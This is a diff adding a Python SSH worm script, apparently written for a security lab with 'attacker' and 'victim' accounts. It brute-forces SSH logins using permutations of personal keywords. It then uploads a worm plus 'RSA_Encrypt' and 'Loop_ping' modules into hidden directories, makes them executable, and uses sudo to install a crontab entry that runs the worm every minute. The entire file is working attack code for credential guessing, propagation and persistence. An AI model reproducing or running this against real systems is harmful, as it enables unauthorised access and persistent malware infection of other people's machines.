@@ -1,0 +1,142 @@
+#!/usr/bin/env python3
+
+import paramiko
+import itertools
+import socket
+import logging
+import time
+import sys
+
+def check_input():
+    if len(sys.argv)!=2:
+        print("[!] Usage: ./sshworm <IP address>")
+        exit()
+    return str(sys.argv[1])
+
+def load_combo(path):
+    keyword=['YueHan','Wang','YH','1999','0228','oscar','Realtek','@','_']
+    #dfile = open(path,"r")
+    #line = dfile.readlines(1)
+    #while line != []:
+    #    word=line[0].split(":",1)[1].split("\n",1)[0]
+    #    keyword.extend(v for v in word.split(" ") if v!='')
+    #    line=dfile.readlines(1)
+    #dfile.close()
+    keyword=["".join(a) for a in itertools.permutations(keyword,2)]
+    return keyword
+
+def try_ssh(host, password):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
+    try:
+        client.connect(host, 22, "attacker", password)
+        print("\n\n[+] Successfully connected!")
+        return 1
+    except socket.error:
+        print("\n[!] Computer is offline or port 22 is closed")
+        return 2
+    except paramiko.AuthenticationException:
+        print("......")
+        return 3
+    except paramiko.ssh_exception.SSHException:
+        print("\n[!] No response from SSH server")
+        return 4
+
+def add_worm(host, password):
+    try:
+        t = paramiko.Transport((host, 22))
+        t.connect(username="attacker", password=password)
+        sftp = paramiko.SFTPClient.from_transport(t)
+    except Exception as e:
+        print(e)
+        
+    dir1 = "/home/attacker/Public/.Simple_Worm"
+    dir2 = "/home/attacker/Desktop/.Backup"
+    RSAf = "RSA_Encrypt"
+    Loop = "Loop_ping"
+    Worm = "0516320worm"
+
+    try:
+        sftp.mkdir(dir1)
+    except:
+        print("[!] DIR: "+dir1+" existed.")
+    try:
+        sftp.mkdir(dir2)
+    except:
+        print("[!] DIR: "+dir2+" existed.")
+    try:
+        sftp.put(RSAf,dir1+"/RSA_Encrypt")
+        sftp.put(RSAf,dir2+"/RSA_Encrypt")
+        sftp.put(Worm,dir1+"/0516320worm")
+        sftp.put(Worm,dir2+"/0516320worm")
+        sftp.put(Loop,dir1+"/Loop_ping")
+        sftp.put(Loop,dir2+"/Loop_ping")
+        print("[+] Worm & modules have been uploaded.")
+    except:
+        print("[!] Upload failed.")
+    try:
+        sftp.chmod(dir1+"/RSA_Encrypt",0o755)
+        sftp.chmod(dir2+"/RSA_Encrypt",0o755)
+        sftp.chmod(dir1+"/0516320worm",0o755)
+        sftp.chmod(dir2+"/0516320worm",0o755)
+        sftp.chmod(dir1+"/Loop_ping",0o755)
+        sftp.chmod(dir2+"/Loop_ping",0o755)
+        print("[+] Worm & modules chmod have been modified.")
+    except:
+        print("[!] Chmod failed.")
+    try:
+        ssh = paramiko.SSHClient()
+        ssh._transport = t
+        stdin, stdout, stderr = ssh.exec_command("sudo -S -p '' cat /etc/crontab")
+        stdin.write(password + "\n")
+        f=open("cron.tmp","w")
+        f.write(stdout.read().decode())
+        f.write("* * * * * /home/attacker/Public/.Simple_Worm/0516320worm || /home/attacker/Desktop/.Backup/0516320worm >/dev/null 2>&1\n")
+        f.close()
+        stdin.flush()
+        sftp.put("cron.tmp", "/home/attacker/Public/.Simple_Worm/cron.tmp")
+        stdin, stdout, stderr = ssh.exec_command("sudo -S -p '' crontab /home/attacker/Public/.Simple_Worm/cron.tmp")
+        stdin.write(password + "\n")
+        stdin.flush()
+        stdin, stdout, stderr = ssh.exec_command("sudo -S -p '' service cron restart")
+        stdin.write(password + "\n")
+        stdin.flush()
+        print("[+] Crontab Sucessful.")
+    except:
+        print("[!] Crontab failed.")
+
+
+
+def main():
+    att_data="/home/victim/materials/attacker.dat"
+    flag=4
+    realpwd=""
+
+    ipaddress = check_input()
+    print("--------------------------------")
+    print("IP address : "+ipaddress)
+    print("--------------------------------")
+    print("[+] Loading passwd from "+att_data+", Abort. From variable database.")
+    passwdlist = load_combo(att_data)
+    #passwdlist=['YH0228']
+    #print(passwdlist)
+    for pwd in passwdlist:
+        while flag is 4: 
+            print("[+] Trying SSH (attacker,"+pwd+")",end='')
+            flag=try_ssh(ipaddress,pwd)
+        if flag is 1:
+            realpwd=pwd
+            break
+        flag=4
+    print("--------------------------------")
+    if realpwd is "":
+        print("[-] password not found. Exit.")
+        exit()
+    print("[+] Upload Worm to "+ipaddress)
+    add_worm(ipaddress,realpwd)
+
+
+if __name__ == "__main__":
+    main()
+
